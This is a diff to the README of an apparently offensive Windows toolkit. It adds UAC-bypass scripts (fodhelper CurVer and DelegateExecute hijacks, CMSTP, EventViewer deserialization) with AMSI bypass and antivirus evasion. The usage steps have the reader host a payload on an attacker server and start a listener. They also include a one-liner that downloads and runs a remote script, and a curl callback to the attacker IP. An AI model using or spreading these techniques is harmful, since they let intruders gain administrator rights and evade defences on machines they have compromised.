@@ -4,7 +4,10 @@
 
 | File | Purpose |
 |---|---|
-| `uac-bypass.ps1` | PowerShell — fodhelper registry hijack with inline AMSI bypass + AV evasion |
+| `uac-bypass.ps1` | PowerShell — fodhelper `DelegateExecute` hijack (inline AMSI bypass + AV evasion) |
+| `uac-bypass-curver.ps1` | PowerShell — fodhelper **CurVer** hijack (more reliable on Win10/Win11) |
+| `cmstp.ps1` | CMSTP UAC bypass (embedded .NET assembly) — `Bypass-UAC -Command "<cmd>"` |
+| `invoke-eventviewer.ps1` | EventViewer UAC bypass (Unsafe .NET deserialization) — `Invoke-EventViewer <cmd>` |
 
 ## Usage
 
@@ -17,7 +20,8 @@ Replace `<IP>` with your attacker IP. `run.ps1` is whatever you want executed el
 
 **2. Host your payload on your HTTP server:**
 ```bash
-python3 -m http.server 80
+sudo systemctl start apache2
+sudo cp run.ps1 /var/www/html/
 ```
 
 **3. Start your listener:**
@@ -61,3 +65,17 @@ C:\\Windows\\System32\\fodhelper.exe
 ```
 
 > Use the manual one-liners when you already have a shell and just need quick elevation. Use `uac-bypass.ps1` when you need AV evasion and AMSI bypass baked in.
+
+---
+
+## More UAC bypass techniques
+
+| Technique | When to use | How |
+|---|---|---|
+| `uac-bypass-curver.ps1` (fodhelper **CurVer**) | Newer Win10/11 where the plain `DelegateExecute` trick is patched | edit the payload, run non-elevated — drop-in replacement for `uac-bypass.ps1` |
+| `cmstp.ps1` (CMSTP) | `cmstp.exe` (signed LOLBin) available | `iex(iwr http://<IP>/cmstp.ps1 -useb)` then `Bypass-UAC -Command "curl http://<IP>/worked"` |
+| `invoke-eventviewer.ps1` (EventViewer) | `eventvwr.exe` available | `Import-Module .\invoke-eventviewer.ps1` then `Invoke-EventViewer cmd.exe` |
+
+The **CurVer** trick registers a fake ProgID and points `ms-settings\CurVer` at it, so
+`fodhelper.exe` auto-elevates and runs it — more reliable than the classic
+`DelegateExecute` value on patched builds.
